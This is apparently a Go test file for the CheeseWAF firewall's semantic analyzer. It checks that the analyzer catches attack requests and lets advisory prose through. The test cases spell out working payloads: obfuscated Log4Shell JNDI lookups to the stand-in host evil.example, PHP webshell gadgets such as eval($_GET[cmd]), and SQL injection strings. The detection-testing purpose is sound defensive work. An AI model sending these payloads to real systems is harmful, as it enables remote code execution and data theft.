package semantic

import (
	"context"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/LaokeQwQ/CheeseWAF/internal/engine"
)

func detectRecall(t *testing.T, method, target, ct, body string, cookies ...*http.Cookie) *engine.DetectionResult {
	t.Helper()
	req := httptest.NewRequest(method, "http://x"+target, strings.NewReader(body))
	if ct != "" {
		req.Header.Set("Content-Type", ct)
	}
	for _, c := range cookies {
		req.AddCookie(c)
	}
	reqCtx, err := engine.NewRequestContext(req, "default")
	if err != nil {
		t.Fatal(err)
	}
	if body != "" {
		reqCtx.DecodedBody = []byte(body)
	}
	got, err := NewAnalyzer("block", 2).Detect(context.Background(), reqCtx)
	if err != nil {
		t.Fatal(err)
	}
	return got
}

func TestRecallHardeningDetectsCompleteAttackShapes(t *testing.T) {
	cases := []struct {
		name, method, target, ct, body, want string
	}{
		{"jndi-ldap", http.MethodGet, "/solr/admin/cores?action=${jndi:ldap://evil.example/a}", "", "", "log4shell"},
		{"jndi-nested-host", http.MethodGet, "/x?q=${jndi:ldap://${sys:java.version}.evil.example/a}", "", "", "log4shell"},
		{"jndi-obfuscated", http.MethodGet, "/x?q=${${::-j}ndi:ldap://evil.example/a}", "", "", "log4shell"},
		{"jndi-empty-default", http.MethodGet, "/x?q=${${:-j}ndi:ldap://evil.example/a}", "", "", "log4shell"},
		{"jndi-named-default", http.MethodGet, "/x?q=${${foo:-j}ndi:ldap://evil.example/a}", "", "", "log4shell"},
		{"jndi-lower-default", http.MethodGet, "/x?q=${${lower:-j}ndi:ldap://evil.example/a}", "", "", "log4shell"},
		{"jndi-lower-proto", http.MethodGet, "/x?q=${jndi:${lower:l}dap://evil.example/a}", "", "", "log4shell"},
		{"jndi-env-default", http.MethodGet, "/x?q=${${env:BARFOO:-j}ndi:ldap://evil.example/a}", "", "", "log4shell"},
		{"jndi-letterwise", http.MethodGet, "/x?q=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.example/a}", "", "", "log4shell"},
		{"jndi-date-literal", http.MethodGet, "/x?q=${${date:'j'}ndi:ldap://evil.example/a}", "", "", "log4shell"},
		{"php-callback-query", http.MethodGet, "/index.php?a=system&b=ls&code=$_GET[a]($_GET[b])", "", "", "webshell"},
		{"php-eval-get-query", http.MethodGet, "/index.php?x=@eval($_GET[_]);", "", "", "webshell"},
		{"php-eval-post-query", http.MethodGet, "/?s=/{${eval($_POST[u])}}", "", "", "webshell"},
		{"php-system-get-query", http.MethodGet, "/index.php?x=system($_GET[cmd])", "", "", "webshell"},
		{"php-eval-form", http.MethodPost, "/index.php", "application/x-www-form-urlencoded", "s=/{${eval($_POST[u])}}", "webshell"},
		{"php-eval-json", http.MethodPost, "/index.php", "application/json", `{"s":"eval($_POST[u])"}`, "webshell"},
		{"php-header-eval-query", http.MethodGet, "/1.php?code=eval(end(getallheaders()))", "", "", "rce"},
		{"php-header-assert-query", http.MethodGet, "/1.php?code=assert(end(getallheaders()))", "", "", "rce"},
		{"php-header-eval-form", http.MethodPost, "/1.php", "application/x-www-form-urlencoded", "code=eval(end(getallheaders()))", "rce"},
		{"php-header-apache-query", http.MethodGet, "/1.php?code=eval(apache_request_headers())", "", "", "rce"},
		{"sqli-or-admin-comment", http.MethodGet, "/search?q=admin'+or+admin--", "", "", "sqli"},
		{"sqli-or-1-equal", http.MethodGet, "/search?q=1'+or+'1'%3d'1", "", "", "sqli"},
		{"sqli-or-paren-2eq2", http.MethodGet, "/search?q=1'+or+(2%3d2)", "", "", "sqli"},
		{"sqli-or-not-1eq1", http.MethodGet, "/search?q=1'+or+not+1%3d1", "", "", "sqli"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := detectRecall(t, tc.method, tc.target, tc.ct, tc.body)
			if got == nil || !got.Detected {
				t.Fatalf("missed %s", tc.want)
			}
			if got.Category != tc.want {
				t.Fatalf("want %s got %s msg=%s", tc.want, got.Category, got.Message)
			}
		})
	}
}

func TestRecallHardeningCookiePHPGadget(t *testing.T) {
	got := detectRecall(t, http.MethodGet, "/index.php", "", "", &http.Cookie{Name: "x", Value: "eval($_GET[cmd])"})
	if got == nil || !got.Detected || got.Category != "webshell" {
		t.Fatalf("cookie gadget missed: %+v", got)
	}
}

func TestRecallHardeningQuotedOrIgnoresEnglishAlternatives(t *testing.T) {
	prose := `Impersonating a target's acquaintances (e.g., "测试环境/test environments" or "后台地址/admin portals"), or recent events to appear authentic.`
	if quotedOrPredicateInjection(prose) {
		t.Fatal("english quoted alternatives must not look like quoted OR injection")
	}
	if quotedOrPredicateInjection(`"feature" or bug#123`) ||
		quotedOrPredicateInjection(`"apples" or oranges like these`) ||
		quotedOrPredicateInjection(`"retry now" or (if needed)`) {
		t.Fatal("english or-alternatives must not look like quoted OR injection")
	}
	got := detectRecall(t, http.MethodPost, "/api/articles", "application/json",
		`{"content":"use \"test environments\" or \"admin portals\" here"}`)
	if got != nil && got.Detected && got.Category == "sqli" {
		t.Fatalf("english quoted alternatives blocked as sqli: %+v", got)
	}
	attacks := []string{
		"' or '1'='1",
		"' or 1=1--",
		"' or ''='",
		`" or "1"="1"`,
		"' or 1--",
		"' or sleep(5)",
		"' or (select 1)",
		"admin' or 1=1#",
		"' or admin--",
		"' or username--",
		"' or (2=2)",
		"' or not 1=1",
	}
	for _, payload := range attacks {
		if !quotedOrPredicateInjection(payload) {
			t.Fatalf("missed quoted OR injection %q", payload)
		}
	}
}

func TestRecallHardeningEmbeddedJNDINotBlockedAtDefault(t *testing.T) {
	got := detectRecall(t, http.MethodPost, "/api/articles", "text/plain",
		"note ${jndi:ldap://evil.example/a} in logs")
	if got != nil && got.Detected {
		t.Fatalf("embedded JNDI must not block at default: cat=%s", got.Category)
	}
}

func TestRecallHardeningEmbeddedJNDIBlockedAtParanoid(t *testing.T) {
	req := httptest.NewRequest(http.MethodPost, "http://x/api/articles", strings.NewReader("note ${jndi:ldap://evil.example/a} in logs"))
	req.Header.Set("Content-Type", "text/plain")
	reqCtx, err := engine.NewRequestContext(req, "default")
	if err != nil {
		t.Fatal(err)
	}
	reqCtx.DecodedBody = []byte("note ${jndi:ldap://evil.example/a} in logs")
	got, err := NewAnalyzer("block", 5).Detect(context.Background(), reqCtx)
	if err != nil {
		t.Fatal(err)
	}
	if got == nil || !got.Detected || got.Category != "log4shell" {
		t.Fatalf("embedded JNDI should still block at the strictest shipped level: %+v", got)
	}
}

func TestRecallHardeningDoesNotFireOnAdvisoryProse(t *testing.T) {
	body := "Researchers documented eval($_GET['cmd']) and a Log4j JNDI lookup in a writeup. " +
		"The article also quotes Runtime.getRuntime().exec(request.getParameter(\"c\"))."
	got := detectRecall(t, http.MethodPost, "/api/articles", "text/plain", body)
	if got != nil && got.Detected {
		t.Fatalf("advisory prose must not block: cat=%s msg=%s payload=%s", got.Category, got.Message, got.Payload)
	}
}

func TestRecallHardeningSearchBoxPHPGadgetIsRequestTarget(t *testing.T) {
	// A search box is still the request target; the same tokens as an installed
	// shell parameter are indistinguishable on the query string.
	got := detectRecall(t, http.MethodGet, "/search?q=eval($_GET[cmd])", "", "")
	if got == nil || !got.Detected || got.Category != "webshell" {
		t.Fatalf("query gadget on /search should still detect: %+v", got)
	}
}
